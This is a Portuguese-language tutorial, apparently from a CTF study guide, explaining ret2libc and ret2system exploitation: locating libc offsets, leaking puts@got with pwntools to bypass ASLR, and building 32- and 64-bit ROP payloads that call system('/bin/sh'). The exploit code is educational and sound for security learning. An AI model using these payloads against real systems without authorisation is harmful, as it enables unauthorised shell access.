ret2libc é um caso de ROP onde, em vez de pular para uma função do próprio programa, pulamos para uma função da libc (biblioteca de funções padrão do C), como `system()`, `execve()`, `mprotect()`, `gets()`, etc. A libc inteira está mapeada na memória do processo, então todas as funções dela estão disponíveis, mesmo que o programa nunca as use.

Como exemplo, vamos fazer um ret2libc com a função `system()`, que é a mais comum, pois executa qualquer comando e pode abrir uma shell.

## Antes: Como achar os endereços?

### Sem ASLR

Tudo fica no mesmo lugar de sempre.

Passo 1: Encontre onde a libc está carregada com `ldd` (List Dynamic Dependencies - lista bibliotecas dinâmicas que o programa precisa, como `libc`)

```
$ ldd ./programa_vulneravel
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dc0000)
    # ↑ Aqui! Base da libc = 0x00007ffff7dc0000
```

Passo 2: Encontre os "offsets" (distâncias)

```
$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " system"
  235: 000000000004c350    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5
    # ↑ Offset do system = 0x4c350

$ strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
 1b45bd /bin/sh
    # ↑ Offset do /bin/sh = 0x1b45bd (a própria libc tem essa string, usada pelo system())
```

Passo 3: Some base + offset
```
system_addr = 0x00007ffff7dc0000 + 0x4c350  = 0x7ffff7e0c350
bin_sh_addr = 0x00007ffff7dc0000 + 0x1b45bd = 0x7ffff7f745bd
```

Com pwntools, isso tudo vira:

```py
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = 0x00007ffff7dc0000          # base
system_addr = libc.sym['system']
bin_sh_addr = next(libc.search(b'/bin/sh\0'))
```

### Com ASLR

Precisamos vazar um endereço primeiro.

Parte 1: Vazar um endereço conhecido. A ideia clássica é chamar `puts(puts@got)`: a GOT contém o endereço real do `puts` na libc, e o próprio `puts` imprime esse endereço para nós. Depois voltamos para a `main` para poder fazer o overflow de novo, agora sabendo os endereços.

```py
# x86-64: o argumento vai em rdi
payload1 = padding + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])

# x86 (32 bits): o argumento vai na stack, depois do endereço de retorno
payload1 = padding + p32(elf.plt['puts']) + p32(elf.sym['main']) + p32(elf.got['puts'])
```

Parte 2: Calcular base da libc. A randomização só muda a base: o offset de cada função dentro da libc é fixo, então precisamos da **mesma libc do servidor** (CTFs normalmente a fornecem. Se não, descubra pelos últimos 3 dígitos do leak em sites como [libc.rip](https://libc.rip)).

```py
p.recvuntil(...)                                   # até a saída do puts
leaked_puts = u64(p.recvline().strip().ljust(8, b'\0'))   # Ex: 0x7ffff7e3d420 (6 bytes impressos, completamos até 8)
libc.address = leaked_puts - libc.sym['puts']      # base = 0x7ffff7dc0000
system_addr = libc.sym['system']
bin_sh_addr = next(libc.search(b'/bin/sh\0'))
# Parte 3: segundo payload, agora com os endereços certos (ret2system abaixo)
```

## ret2system


ret2system é um caso de ROP ret2libc onde usamos a função `system()`. Essa função executa um comando shell qualquer (abrir app, `ls`, `/bin/sh`, etc).

Para fazer um ret2system:

1. Chama-se `system()` no return address
2. Coloca-se `exit()` após return address. Quando `system()` retornar, `exit()` será executado. (saída limpa)
3. Coloca-se argumento para system após `exit()`

Para entender como chamar `system()` e passar os parâmetros, recomendo ver o material [Convenção de chamada de funções](../../../extra/call-convention.mdx).

### Para x86 (32-bit):

```
payload = b"A" * 76           # Preencher buffer até return address
payload += p32(0xb7e3d850)   # system()    ← Sobrescreve return address
payload += p32(0xb7e2f5c0)   # exit()      ← Executado quando system() retornar
payload += p32(0xb7f5d0f8)   # "/bin/sh"   ← Argumento para system()!
                            #             ↑ ESP+4 (frame antigo) ou EBP+8 (frame novo) quando system() começa
```

Isso ocorre pois, após chamar system (`pop eip`), `esp` atual = exit(). O system() vai fazer `push rbp`, `mov rbp, rsp`, e teremos:

```
EBP   → EBP antigo (lixo agora, por causa do BOF)
EBP+4 → exit() (return address)
EBP+8 → 1° parâmetro
```

Isto, pois system() internamente faz:

```
; system() em x86 (32-bit)
system:
    push    ebp                 ; Salva frame pointer antigo
    mov     ebp, esp            ; Novo frame pointer
    sub     esp, 0x10           ; Aloca espaço para variáveis locais
    mov     eax, [ebp+8]        ; Pega primeiro argumento (comando)
    mov     [esp], eax          ; Prepara argumento para função interna
    call    do_system           ; Função interna real
    ; ... mais código ...
    ret

; system() em x64 (64-bit)  
system:
    push    rbp                 ; Salva frame pointer
    mov     rbp, rsp            ; Novo frame pointer  
    sub     rsp, 0x10           ; Espaço local
    mov     QWORD PTR [rsp], rdi  ; Salva argumento na stack para função interna
    call    do_system           ; Função interna real
    ; ... mais código ...
    ret
```

### para x86-64 (64-bit)

Basta usar um gadget ROP para colocar o primeiro parâmetro em `rdi`, já que os parâmetros são pegos dos registradores.

```py
payload = b"A" * 72            # Padding até RIP
payload += p64(ret)            # gadget: ret (alinhamento da stack, veja abaixo)
payload += p64(pop_rdi)        # gadget: pop rdi; ret
payload += p64(bin_sh_addr)    # "/bin/sh" em RDI
payload += p64(system_addr)    # system()
payload += p64(exit_addr)      # exit() - opcional
```

O `ret` extra no início é quase sempre necessário em 64 bits: o `system()` usa instruções SSE que exigem a stack alinhada em 16 bytes, e ao entrarmos nele por `ret` em vez de `call` a stack fica desalinhada em 8 bytes (veja [Desalinhamento de Stack](../buffer-overflow/return-address.md#cuidado-ao-sobrescrever-return-address-desalinhamento-de-stack)). Se der `SIGSEGV` dentro do `system` em um `movaps`, é isso.

Em 32 bits não há esse problema, e também não há gadgets: os argumentos vão direto na stack, como mostrado acima.
